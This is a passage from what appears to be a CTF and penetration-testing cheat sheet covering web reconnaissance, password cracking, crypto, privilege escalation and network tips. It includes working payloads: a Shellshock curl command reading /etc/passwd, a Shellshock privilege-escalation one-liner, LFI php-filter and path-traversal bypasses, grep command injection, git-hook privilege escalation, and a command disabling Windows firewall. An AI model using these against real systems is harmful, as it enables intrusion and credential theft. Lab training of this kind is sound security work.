- See if there is any hint in the title of the web page. (example: /Magic).
- Check the scroll button! Sometimes, there are too many lines and something hidden in the end of the webpage!
- Check for any long file names such admin_5f4dcc3b5aa765d61d8327deb882cf99.txt; Such long names can be base64-encoded, hex, md5 etc.
- If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.
- If there's a page where redirect is happening (for example, http://example.com or http://example.com/support.php redirects us to http://example.com/login.php) However, the response size for example.com or support.php is a bit off, especially considering the page gives a 302 redirect. We may use No-redirect extension from firefox and view the page. We may also utilize curl/ burp to view the response.
- [List of HTTP Headers](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields) : Quite important when you want to set headers/ cookies etc.
- Watch for places where the site redirects you (it adds something to the URL and displays the homepage). If you see that happen, try adjusting the URL manually. for example: when browsing

  ```none
  http://IPAddress/SitePages/
  ```
  
  it redirects to

  ```none
  http://IPAddress/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx
  ```

  we may find something by adjusting the URL manually to

  ```none
  http://IPAddress/SitePages/Forms/AllPages.aspx
  ```

#### CSC Austria: CTF Tips and Tricks

Refer [SEC Consult – Cyber Security Challenge Austria /CTF Tips & Tricks](https://security-hub.at/download/csc_austria_ctf_tips_and_tricks.pdf)

- Read the source code / comments
- Check for common hidden files / folders (.git, .ssh, robots.txt, backup, .DS_Store, .svn, changelog.txt, server-status, admin, administrator, …)
- Check for common extensions (Example: If you see a index.php file, check index.php.tmp, index.php.bak, and so on)
- Play with the URL / parameters / cookies (Example: If you have a page with index.php?role=user try to change it to index.php?role=admin).
- Get familiar with the website, it’s functionalities and features before starting an in-depth analysis.
- Try to map the full attack-surface of the website! Some vulnerabilities are hidden deep in hard-to-reach functionalities.
- Test for the most common vulnerabilities like SQLi (SQL Injection), XXE (XML Entity Injection), Path Traversal, File Uploads, Command Injection, Cookie Tampering, XSS (Cross-Site-Scripting), XPATH Injection, Unserialization bugs, Outdated software, CSRF
  (Cross-Site-Request-Forgery), SSRF (Server-Side-Request-Forgery), SSTI (Server-Side Template Injection), LFI/RFI (Local-File-Inclusion / Remote-File-Inclusion), Flaws in Session Management or Authorization Flaws, the randomness of the cookies, and so on.
- If you come across a technology which you don’t know, try to google security writeups for these technologies.
- Try special characters

  ```none
  (‘, “, {, ;, |, &&, \, /, !(), %…)
  ```

  in all input fields (GET- and POST parameters and Cookies) and check for uncommon responses or error messages.
- To detect blind vulnerabilities (SQL injection, command injection, XSS, …) you can use time delays or requests to one of your web servers (check the access logs).
- If you can provide a path or a filename to the website, you should test for path traversal vulnerabilities. If the application replaces the

  ```none
  “../”
  ```

  with an empty string, you can try to bypass it by injecting the sequence two times, like:
  
  ```none
  “…/./”.
  ```
  
  If the “../” in the center gets replaced, the application will again work with “../”. You can also try different encodings or other removed characters. Moreover, you can try to create or upload (e.g. via archives) a symbolic link.
- If you found a LFI (local-file-inclusion) vulnerability in a PHP website and you want to read the PHP scripts, you can use php-filter (you can’t normally read .php files because the inclusion would try to execute the code instead of displaying it;
with php-filter you can first base64-encode the content to display it):

  ```none
  index.php?filename=php://filter/convert.base64-encode/resource=index.php
  ```

#### htaccess - UserAgent

When you see something like this "Someone's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content". Which says, only this can see me. Try to see what user-agent it is talking about. The way it is implemented is by use of .htaccess file

```none
cat .htaccess 
BrowserMatchNoCase "iPhone" allowed

Order Deny,Allow 
Deny from ALL 
Allow from env=allowed 
ErrorDocument 403 “<H1>Super secret location - only me and Steve Jobs can see this content</H1><H2>Lol</H2>”
```

#### CGI-BIN Shellshock

To understand shellshock few blogs can be referred such as [ShellShocked – A quick demo of how easy it is to exploit](https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/) , [Inside Shellshock: How hackers are using it to exploit systems](https://blog.cloudflare.com/inside-shellshock/)

```none
curl -H "User-Agent: () { :; }; echo 'Content-type: text/html'; echo; /bin/cat /etc/passwd" http://192.168.56.2:591/cgi-bin/cat
```

It is important to understand what is cgi-bin which can be read from [Creating CGI Programs with Bash: Getting Started](http://www.team2053.org/docs/bashcgi/gettingstarted.html) . Also the most important lines in this file are:

```none
echo "Content-type: text/html"
echo ""
```

These two lines tell your browser that the rest of the content coming from the program is HTML, and should be treated as such. Leaving these lines out will often cause your browser to download the output of the program to disk as a text file instead of displaying it, since it doesn't understand that it is HTML!

**Shellshock Local Privilege Escalation**

Binaries with a setuid bit and calling (directly or indirectly) bash through execve, popen or system are tools which may be used to activate the Shell Shock bug.

```none
sudo PS1="() { :;} ;  /bin/sh" /home/username/suidbinary
```

Shellshock also affects DHCP as mentioned [Shellshock DHCP RCE Proof of Concept](https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/) There's a metasploit module named "Dhclient Bash Environment Variable Injection (Shellshock)" for this.

#### XSS/ HTML Injection

The below will redirect the page to google.com

```none
<META http-equiv=“refresh” content=“0;URL=http://www.google.com”>
```

#### curl

```none
-k, --insecure
(SSL) This option explicitly allows curl to perform "insecure" SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
This makes all connections considered "insecure" fail unless -k, --insecure is used.

-I, --head
(HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size and last modification time only.
```

#### HTTP Referer

The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed. The Referer header allows servers to identify where people are visiting them from and may use that data for analytics, logging, or optimized caching.

```none
Referer: <url>

<url> An absolute or partial address of the previous web page from which a link to the currently requested page was followed. URL fragments (i.e. "#section") are not included.
```

#### Data-URI

[Basics of HTTP Data URI](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics\_of\_HTTP/Data\_URIs)

#### Login-Pages

To test login pages, we may use burpsuite intruder and check for different length of response.

#### Delete Tags

Delete all lines between tags including tags:

```none
sed '/<tag>/,/<\/tag>/d' input.txt
```

Tip

Useful when you are accessing the webpage using curl and their LFI and you want to remove the html/ body tags.

#### HTTP 404 Custom Page

Sometimes, it's a good idea to look at 404 custom page also. There might be some information stored.

### Password Protected File

#### ZIP File

run fcrackzip

```none
fcrackzip -D -u -p /tmp/rockyou2.txt flag.zip

-D, --dictionary:    Select dictionary mode. In this mode, fcrackzip will read passwords from a file, which must contain one password per line and should be alphabetically sorted (e.g. using sort(1)).
-p, --init-password string :  Set initial (starting) password for brute-force searching to string, or use the file with the name string to supply passwords for dictionary searching.
-u, --use-unzip: Try to decompress the first file by calling unzip with the guessed password. This weeds out false positives when not enough files have been given.
```

#### rar2john

We can get the password hash of a password protected rar file by using rar2john

```none
[root:~/Downloads]# rar2john crocs.rar
file name: artwork.jpg
crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg
```

#### keepass2john

```none
keepass2john user.kdbx 
user:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
```

```none
john --wordlist wordlist --format=keepass hashfile
```

There are other \*2john thingy

```none
dmg2john
gpg2john
hccap2john
keepass2john
keychain2john
keyring2john
keystore2john
kwallet2john
luks2john
pfx2john
putty2john
pwsafe2john
racf2john
rar2john
ssh2john
truecrypt_volume2john
uaf2john
wpapcap2john
zip2john
```

### Encrypted Files

Many times during the challenges, we do find encrypted files encrypted by Symmetric key encryption or RSA Public-Private Key encryption

#### Symmetric Key

If we have the encrypted file and the key to it. However, we don't know the encryption scheme such as aes-128-cbc, des-cbc.

We can use the code written by superkojiman in [De-ICE Hacking Challenge Part-1](https://blog.techorganic.com/2011/07/19/de-ice-hacking-challenge-part-1/) , it would tell you what encryption scheme is used and then we can run the command to retrieve the plaintext.

```none
ciphers=`openssl list-cipher-commands`
for i in $ciphers; do
  openssl enc -d -${i} -in <encrypted-file> -k <password/ keyfile> > /dev/null 2>&1
  if [[ $? -eq 0 ]]; then
   echo "Cipher is $i: openssl enc -d -${i} -in <encrypted-file> -k <password/ keyfile> -out foo.txt"
   exit
  fi
done
```

#### RSA Public-Private Key encryption

If we have found a weak RSA public, we can use [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) uncipher data from weak public key and try to recover private key and then use

```none
openssl rsautl -decrypt -inkey privatekey.pem -in <encryptedfile> -out key.bin 
```

The ciphertext should be in binary format for RsaCtfTool to work. If you have your ciphertext in hex, for example

```none
5e14f2c53cbc04b82a35414dc670a8a474ee0021349f280bfef215e23d40601a
```

Convert it in to binary using

```none
xxd -r -p ciphertext > ciphertext3
```

#### RSA given q, p and e?

Taken from [RSA Given q,p and e](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)

```py
def egcd(a, b):
  x,y, u,v = 0,1, 1,0
  while a != 0:
    q, r = b//a, b%a
    m, n = x-u*q, y-v*q
    b,a, x,y, u,v = a,r, u,v, m,n
    gcd = b
  return gcd, x, y

def main():

  p = 1090660992520643446103273789680343
  q = 1162435056374824133712043309728653
  e = 65537
  ct = 299604539773691895576847697095098784338054746292313044353582078965

  # compute n
  n = p * q

  # Compute phi(n)
  phi = (p - 1) * (q - 1)

  # Compute modular inverse of e
  gcd, a, b = egcd(e, phi)
  d = a

  print( "n:  " + str(d) );

  # Decrypt ciphertext
  pt = pow(ct, d, n)
  print( "pt: " + str(pt) )

if __name__ == "__main__":
  main()
```

#### SECCURE Elliptic Curve Crypto Utility for Reliable Encryption

If you see, something like this

```none
'\x00\x146\x17\xe9\xc1\x1a\x7fkX\xec\xa0n,h\xb4\xd0\x98\xeaO[\xf8\xfa\x85\xaa\xb37!\xf0j\x0e\xd4\xd0\x8b\xfe}\x8a\xd2+\xf2\xceu\x07\x90K2E\x12\x1d\xf1\xd8\x8f\xc6\x91\t<w\x99\x1b9\x98'
```

it's probably [SECCURE Elliptic Curve Crypto Utility for Reliable Encryption](http://point-at-infinity.org/seccure/) Utilize python module [seccure](https://pypi.python.org/pypi/seccure) to get the plaintext.

#### GPG

Where are the GPG Keys stored?

By default in ~/.gnupg/ and can be found using

```none
gpg -K
```

### Network Information

Sometimes, ifconfig and netstat are not present on the system. If so, check if ip and ss are installed?

ip
^^

```none
ip addr
    
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
17: wwan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
link/ether b2:06:fe:2b:73:c6 brd ff:ff:ff:ff:ff:ff
inet 14.97.194.148/30 brd 14.97.194.151 scope global dynamic noprefixroute wwan0
valid_lft 5222sec preferred_lft 5222sec
```

#### hostname

We can also check the ipaddress of the host using hostname command

```none
hostname -I
172.17.0.1 14.97.194.148
```

#### ss

ss - another utility to investigate sockets

```none
ss
 
  -n, --numeric
        Do not try to resolve service names.
  -l, --listening
        Display only listening sockets (these are omitted by default).
  -t, --tcp
        Display TCP sockets.

  -u, --udp
        Display UDP sockets.
```

### User Home Directory

If we find that home directory contains

#### Firefox/ Thunderbird/ Seabird

We can utilize [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is a tool to extract passwords from Mozilla (Firefox/ Thunderbird/ Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.

### Sudoers file

If the sudoers file contains:

#### secure_path

Path used for every command run from sudo. If you don't trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.

#### env_reset

If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller's environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.

#### mail_badpass

Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.

### run-parts

run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.

```none
run-parts /etc/cron.daily
```

### Java keystore file

Refer [Java Keytool essentials working with java keystores](https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores) and [openssl essentials working with ssl certificates private keys and csrs](https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats)

### Cracking MD5 Hashes

Try [Crackstation](https://crackstation.net/) or [ISC Reverse hash](https://isc.sans.edu/tools/reversehash.html)

### Steghide

Looking for hidden text in the images? Utilize steghide

```none
steghide version 0.5.1

the first argument must be one of the following:
embed, --embed          embed data
extract, --extract      extract data
info, --info            display information about a cover- or stego-file
info <filename>       display information about <filename>
encinfo, --encinfo      display a list of supported encryption algorithms
version, --version      display version information
license, --license      display steghide's license
help, --help            display this usage information
```

Ti[

Sometimes, there is no password, so just press enter.

### Git client Privilege Escalation

Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer [12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial](https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial)

In one of write-up, [Nicolas Surribas](http://devloop.users.sourceforge.net/) has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.

#### GIT_SSH

If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the username@host (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).

```none
echo '#!/bin/bash' > cmd
echo 'cp /root/flag.txt /tmp' >> cmd
echo 'chmod 777 /tmp/flag.txt' >> cmd
GIT_SSH=/home/username/cmd ./setuidbinary(utilizing git clone/ git fetch)
```

or

```none
echo 'chown root:root /home/username/priv ; chmod 4755 /home/username/priv' > ssh
```

where priv is binary compiled from suid.c

This basically changes the command from

```none
trace: built-in: git 'clone' 'ssh://root@machine-dev:/root/secret-project' '/mnt/secret-project/'
```

to

```none
trace: run_command: '/home/user/ssh' 'root@machine-dev' 'git-upload-pack '\''/root/secret-project'\'''
```

#### GIT_TEMPLATE_DIR

Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer [Git-init](https://git-scm.com/docs/git-init)

```none
cp -r /usr/share/git-core/templates/ mytemplates
cd mytemplates/hooks
echo '#!/bin/bash' > post-checkout
echo 'cp /root/flag /tmp/flag2' >> post-checkout
echo 'chown username.username /tmp/flag2' >> post-checkout
chmod +x post-checkout
cd ../..
GIT_TEMPLATE_DIR=/home/username/mytemplates/ ./setuidbinary( utilizing git clone/ git fetch)
```

### Metasploit shell upgrade

In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u

```none
sessions -h
Usage: sessions [options]
   
Active session manipulation and interaction.

OPTIONS:

-u <opt>  Upgrade a shell to a meterpreter session on many platforms
```

### Truecrypt Files

If you have a truecrypt volume to open and crack it's password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.

```none
truecrack --truecrypt <Truecrypt File> -k SHA512 -w <Wordlist_File>
```

and Veracrypt or cryptsetup to open the file.

```none
cryptsetup open --type tcrypt <Truecrypt> <MountName>
```

### Grep in input box?

- If the html code contains the below where $key is the input from the user, and we want to read a particular value

  ```none
  passthru("grep -i $key dictionary.txt");
  
  Remember grep works in a way "grep bitvijays /etc/passwd" is find bitvijays in /etc/passwd. This can be used in reading some files on the disk.
  ```

- If the above contains

  ```none
  if(preg_match('/[;|&]/',$key)) {
    print "Input contains an illegal character!";
  } else {
    passthru("grep -i $key dictionary.txt");
  }
  ```

  Here we can use ".* /etc/passwd #"

  This command searches for any character in the file and comments out the reference to dictionary.txt

### Others

- While downloading files from FTP, make sure that you have set the mode to binary, otherwise downloaded files could be corrupted.

- It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.

- If there's a RCE in some web-application, probably, one of the way to check RCE is to ping your own machine.

- If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article) https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/

- Identification of OS:

    ```none
    cat /etc/os-release

    NAME="Ubuntu" VERSION="16.04 LTS (Xenial Xerus)" ID=ubuntu
    ID\_LIKE=debian PRETTY\_NAME="Ubuntu 16.04 LTS" VERSION\_ID="16.04"
    HOME\_URL="http://www.ubuntu.com/"
    SUPPORT\_URL="http://help.ubuntu.com/"
    BUG\_REPORT\_URL="http://bugs.launchpad.net/ubuntu/"
    UBUNTU\_CODENAME=xenial
    ```

- Many times if IPv6 is enabled, probably you can utilize IPv6 to connect and bypass firewall restrictions ( If firewall is not implemented at IPv6 level - many times it is not ).

  - To find IPv6 from SNMP

    ```none
      snmpwalk -v2c -c public prism 1.3.6.1.2.1.4.34.1.3    
      iso.3.6.1.2.1.4.34.1.3.2.48.1.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 335544320
      iso.3.6.1.2.1.4.34.1.3.2.48.2.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 335544321
      iso.3.6.1.2.1.4.34.1.3.2.48.2.18.52.86.120.171.205.0.0.0.0.0.0.0.1 = INTEGER: 335544323
      ```

    Now, convert the decimal value after "iso.3.6.1.2.1.4.34.1.3.2" to hex which would be your IPv6 address "3002:1234:5678:ABCD::1"

  ```none
  .. ToDo ::  Mention examples for IPv6 connect
  ```

- Disable windows firewall

  ```none
  netsh firewall set opmode disable
  ```

- Port 139 Open

  ```none
  smbclient -N -L 192.168.1.2 WARNING: The "syslog" option is deprecated
  Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

  Sharename       Type      Comment
  ---------       ----      -------
  print$          Disk      Printer Drivers
  kathy           Disk      Fred, What are we doing here?
  tmp             Disk      All temporary files should be stored here
  IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

  Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

  Server               Comment
  ---------            -------
  RED                  red server (Samba, Ubuntu)

  Workgroup            Master
  ---------            -------
  WORKGROUP            RED

  -N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password. -L\|--list This option allows you to look at what services are available on a server. You use it as smbclient
  -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you are trying to reach a host on another network.
  ```

  If you want to access the share you might want to type

  ```none
  smbclient \\\\IP\\share\_name
  ```
  
  So, in the above example, it would be

  ```none
  smbclient \\\\192.168.1.2\\kathy
  ```
  
  If port 139 is open, also run enum4linux, may be it would help get the user list

  - Port 69 UDP:

    TFTP

    ```none
    get or put file
    ```

  - Want to see what firewall rules are applied in Linux? Get /etc/iptables/rules.v4 and /etc/iptables/rules.v6 file.

  - Ruby Best way to get quoted words / phrases out of the text

      ```none
      text.scan(/"([^"]\*)"/)
      ```

  - Convert all text in a file from UPPER to lowercase

      ```none
      tr '[:upper:]' '[:lower:]' < input.txt > output.txt
      ```

  - Remove lines longer than x or shorter than x
  
      ```none
      awk 'length($0)>x' filename or awk 'length($0)
      ```

  - Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if "Policy of Truth" is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist.

  - Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.

  - If a machine is running a IIS Server and we have found a way to upload a file. We can try asp web-shell or meterpreter of asp, aspx, aspx-exe executable formats from msfvenom.

  - If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it's a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.

      ```none
      13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
      13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
      13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
      13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
      13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
      13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
      13:06:21.933402 Probe Response (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
      13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
      13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown) 
      13:06:21.991250 Authentication (Open System)-1: Successful
      13:06:21.992274 Authentication (Open System)-1: Successful
      13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
      13:06:21.992795 Authentication (Open System)-2: 
      13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
      13:06:21.994834 Assoc Request (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit]
      13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
      13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
      13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
      13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
      13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
      13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0) 
      13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown) 
      13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
      13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
      13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
      13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
      13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
      13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
      13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
      13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
      13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
      13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
      13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
      13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown) 
      13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
      13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
      13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
      13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
      ```

  - Transfer an image

      ```none
      base64 flair.jpg 
      Copy output 
      vi flair 
      Paste the clipboard 
      base64 -d flair > flair.jpg
      ```

  - Have a web-accessible git ? utilize [dvcs-ripper](https://github.com/kost/dvcs-ripper) to rip web accessible (distributed) version control systems: SVN, GIT, Mercurial/hg, bzr. It can rip repositories even when directory browsing is turned off. Eric Gruber has written a blog on [Dumping Git Data from Misconfigured Web Servers](https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/) providing good walkthru.

  - It's always important to find, what's installed on the box:

      ```none
      dpkg-query -l 
      ```

      or using wild cards

      ```none
      dpkg-query -l 'perl*'
      ```

  - It's always important to note down all the passwords found during the process of exploiting a vulnerable machine as there is a great possibility that passwords would be reused.

  - If you have .jar file, Probably use jd-gui to decompile and view the class file.

  - Find recently modified files:
  
      ```none
      find / -mmin -10 -type f 2>/dev/null
      ```

      The above will show you which files have been modified within the last 10 minutes, which could help you find out whether an important config file, or log file has been modified.

  - Getting a reverse shell from:

  - Drupal: Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module. Once enabled we need to give permission to use it so in people -> permissions check "Use the PHP code text for.

    Next, we create a new block (by going to Blocks, under the Structure menu) with the following content. We make sure to select PHP code from the Text format drop down. Taken from [Droopy Vulnhub WriteUp](https://g0blin.co.uk/droopy-vulnhub-writeup/)
    Drupal settings file location: /var/www/html/sites/default/settings.php

  - WordPress : If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.

  - If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy. Probably, squid proxy server would be running. If it is the squid configuration file is /etc/squid/squid.conf

  - If you do get the configuration file, do check for what kind of proxy it is! like SOCKS4, SOCKS5 or HTTP(S) proxy and is there any authentication required to access the proxy.
  - We may utilize [Proxychains](https://github.com/haad/proxychains) to access the other side of network like ssh, http etc.

  - Running Asterisk/ Elastix/ FreePBX or any PBX, probably try [SIPVicious](https://github.com/EnableSecurity/sipvicious), suite is a set of tools that can be used to audit SIP based VoIP systems. Running "http:\\IP\panel" should provide us valid extensions.

  - Sharepoint running? Probably, check [SPartan](https://github.com/sensepost/SPartan), Frontpage and Sharepoint fingerprinting and attack tool and [SharePwn](https://github.com/0rigen/SharePwn) SharePoint Security Auditor.

  - authbind software allows a program that would normally require superuser privileges to access privileged network services to run as a non-privileged user. authbind allows the system administrator to permit specific users and groups access to bind to TCP and UDP ports below 1024.

  - Mostly, if there's only port open like ssh and the IP might be acting as a interface between two networks? Like IT and OT. Probably, try to add that IP address as a default route? As it might be acting as a router?

  - If you are trying to figure out the hostname of the machine and the DNS-Server is not configured, may be try to do a Full Nmap Scan -A Option? (Still need to figure out how does that work)

  - Want to send a email via the SMTP server something like SMTP-Open-Relay utilize [Swaks](http://www.jetmore.org/john/code/swaks/) Swiss Army Knife for SMTP.

      ```none
      swaks --to xxxxx@example.com --from xxxxxee@example.edu --server 192.168.110.105:2525 --body "Hey Buddy How are you doing" --header "Subject: Hello! Long time"
      ```

  - Got /etc/shadow file?, utilize /etc/passwd with unshadow command and use john or cudahashcat to crack passwords.

    ```none
    unshadow passwd shadown
    ```

  - If IIS and WebDav with PUT and MOVE method are enabled, we can use testdav or cadaver (A command-line WebDAV client for Unix) to see which files are allowed

    ```none
    davtest -url http://10.54.98.15/
    ********************************************************
      Testing DAV connection
    OPEN  SUCCEED:  http://10.54.98.15
    ********************************************************
      Random string for this session: E3u9ISnNswYes0
    ********************************************************
      Creating directory
    MKCOL SUCCEED:  Created http://10.54.98.15/DavTestDir_E3u9ISnNswYes0
    ********************************************************
      Sending test files
    PUT pl SUCCEED: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
    PUT asp   FAIL
    PUT aspx  FAIL
    PUT cgi   FAIL
    PUT html  SUCCEED: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
    PUT cfm   SUCCEED:  http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
    PUT jhtml SUCCEED:  http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
    PUT shtml FAIL
    PUT php   SUCCEED:  http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
    PUT jsp   SUCCEED:  http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
    PUT txt   SUCCEED:  http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
    ********************************************************
      Checking for test file execution
    EXEC  pl    FAIL
    EXEC  html  SUCCEED:  http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
    EXEC  cfm   FAIL
